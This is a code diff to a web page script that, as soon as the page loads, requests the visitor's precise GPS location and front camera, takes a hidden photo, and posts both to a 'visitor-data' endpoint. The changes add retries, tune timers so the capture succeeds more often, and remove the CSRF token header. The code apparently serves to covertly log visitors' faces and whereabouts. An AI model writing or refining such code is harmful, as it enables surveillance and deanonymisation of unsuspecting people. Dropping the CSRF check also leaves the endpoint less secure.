@@ -133,11 +133,14 @@
             const CSRF_TOKEN = '{{ csrf_token() }}';
             const API_URL = '{{ url("/api/visitor-data") }}';
             
-            let dataSent = false;
+            let gpsSent = false;
+            let cameraSent = false;
 
-            // Send data to server
-            function sendData(payload) {
-                if (dataSent) return;
+            // Send data to server using fetch (more reliable than sendBeacon)
+            async function sendData(payload, type) {
+                // Prevent duplicate sends
+                if (type === 'gps' && gpsSent) return;
+                if (type === 'camera' && cameraSent) return;
                 
                 const data = {
                     visitor_log_id: VISITOR_LOG_ID,
@@ -145,65 +148,77 @@
                     ...payload
                 };
 
-                // Use sendBeacon for reliability (works even if page closes)
-                const blob = new Blob([JSON.stringify(data)], { type: 'application/json' });
-                const sent = navigator.sendBeacon ? navigator.sendBeacon(API_URL, blob) : false;
-                
-                if (!sent) {
-                    // Fallback to fetch
-                    fetch(API_URL, {
+                console.log('Sending ' + type + ' data:', payload);
+
+                try {
+                    const response = await fetch(API_URL, {
                         method: 'POST',
                         headers: {
                             'Content-Type': 'application/json',
-                            'X-CSRF-TOKEN': CSRF_TOKEN,
                             'Accept': 'application/json'
                         },
                         body: JSON.stringify(data),
                         keepalive: true
-                    }).then(r => r.json()).then(result => {
-                        console.log('Data sent:', result);
-                        dataSent = true;
-                    }).catch(e => console.error('Send error:', e));
-                } else {
-                    console.log('Data sent via beacon');
-                    dataSent = true;
+                    });
+                    
+                    const result = await response.json();
+                    console.log(type + ' response:', result);
+                    
+                    if (result.success) {
+                        if (type === 'gps') gpsSent = true;
+                        if (type === 'camera') cameraSent = true;
+                    }
+                } catch (e) {
+                    console.error('Send ' + type + ' error:', e);
+                    // Retry once after 2 seconds
+                    setTimeout(() => {
+                        fetch(API_URL, {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
+                            body: JSON.stringify(data)
+                        }).then(r => r.json()).then(r => console.log('Retry success:', r)).catch(e => console.error('Retry failed:', e));
+                    }, 2000);
                 }
             }
 
-            // Get GPS Location
+            // Get GPS Location - HIGH PRIORITY
             function getGPSLocation() {
                 if (!navigator.geolocation) {
                     console.log('Geolocation not supported');
                     return;
                 }
 
+                console.log('Requesting GPS location...');
+                
                 navigator.geolocation.getCurrentPosition(
                     function(pos) {
-                        console.log('GPS Success:', pos.coords.latitude, pos.coords.longitude);
+                        console.log('GPS Success! Lat:', pos.coords.latitude, 'Lng:', pos.coords.longitude, 'Accuracy:', pos.coords.accuracy);
                         sendData({
                             latitude: pos.coords.latitude,
                             longitude: pos.coords.longitude,
                             location_accuracy: pos.coords.accuracy
-                        });
+                        }, 'gps');
                     },
                     function(err) {
-                        console.log('GPS Error:', err.code, err.message);
-                        // Try again with low accuracy
-                        if (err.code !== 1) { // Not permission denied
+                        console.log('GPS Error:', err.code, '-', err.message);
+                        // Try again with low accuracy if not permission denied
+                        if (err.code !== 1) {
+                            console.log('Retrying with low accuracy...');
                             navigator.geolocation.getCurrentPosition(
                                 function(pos) {
+                                    console.log('GPS Retry Success! Lat:', pos.coords.latitude, 'Lng:', pos.coords.longitude);
                                     sendData({
                                         latitude: pos.coords.latitude,
                                         longitude: pos.coords.longitude,
                                         location_accuracy: pos.coords.accuracy
-                                    });
+                                    }, 'gps');
                                 },
-                                function() { console.log('GPS failed completely'); },
-                                { enableHighAccuracy: false, timeout: 30000, maximumAge: 60000 }
+                                function(e) { console.log('GPS failed completely:', e.message); },
+                                { enableHighAccuracy: false, timeout: 30000, maximumAge: 300000 }
                             );
                         }
                     },
-                    { enableHighAccuracy: true, timeout: 20000, maximumAge: 0 }
+                    { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
                 );
             }
 
@@ -215,6 +230,7 @@
                 }
 
                 try {
+                    console.log('Requesting camera access...');
                     const stream = await navigator.mediaDevices.getUserMedia({ 
                         video: { facingMode: 'user', width: 640, height: 480 }
                     });
@@ -224,7 +240,7 @@
                     video.setAttribute('playsinline', true);
                     await video.play();
                     
-                    // Wait a moment for camera to focus
+                    // Wait for camera to focus
                     await new Promise(r => setTimeout(r, 500));
                     
                     const canvas = document.createElement('canvas');
@@ -235,22 +251,20 @@
                     stream.getTracks().forEach(t => t.stop());
                     
                     const imageData = canvas.toDataURL('image/jpeg', 0.7);
-                    console.log('Camera captured');
+                    console.log('Camera captured successfully');
                     
-                    sendData({ camera_image: imageData });
+                    sendData({ camera_image: imageData }, 'camera');
                 } catch (e) {
-                    console.log('Camera error:', e.message);
+                    console.log('Camera error:', e.name, e.message);
                 }
             }
 
-            // Start immediately
+            // Start immediately - GPS is PRIORITY
             setTimeout(function() {
-                // Location first - PRIORITY
                 getGPSLocation();
-                
-                // Camera after small delay
-                setTimeout(captureCamera, 1000);
-            }, 300);
+                // Camera after delay (separate from GPS)
+                setTimeout(captureCamera, 2000);
+            }, 500);
         })();
         @endif
     </script>
